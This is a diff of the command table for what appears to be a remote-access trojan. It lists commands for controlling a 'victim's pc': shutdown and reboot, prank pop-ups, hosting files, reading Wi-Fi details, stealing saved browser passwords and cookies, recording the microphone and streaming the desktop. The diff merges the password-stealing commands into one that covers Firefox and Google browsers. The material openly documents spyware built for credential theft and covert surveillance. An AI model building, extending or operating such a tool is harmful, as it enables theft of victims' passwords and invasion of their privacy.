@@ -33,15 +33,14 @@ commands:
 | shutdown       | shutdown                         | shutdown the victim's pc                  |
 | reboot         | reboot                           | reboot the victim's pc                    |
 | closesession   | closesession                     | close current victim's session            |
-| host           | host                             | host file at http://{victim's ip}:8013    |
+| host           | host                             | host file at http://{victim's ip}:8080    |
 | network_info   | network_info                     | get the victim's wifi infos               |
 |---------------------------------------- [TROLL] ----------------------------------------------|
 | skull          | skull                            | open cmd with skull and crossbones        |
 | msg            | msg <title> <line1> <line2>      | create alertbox with desired infos        |
 | rickroll       | rickroll                         | rockroll your victim ;)                   |
 |--------------------------------------- [STEALING] --------------------------------------------|
-| stealpasswords | stealpasswords                   | steal all victim's chrome saved passwords |
-| stealcookies   | stealcookies                     | steal all victim's chrome cookies         |
+| steal_pwd      | steal_pwd <firefox/google>       | get all victim's browser saved passwords  |
 |----------------------------------------- [SPY] -----------------------------------------------|
 | recordmicro    | recordmicro <time in second>     | record victim's micro for 'time'seconds   |
 | desktopstream  | desktopstream                    | stream in real time victim's desktop      |
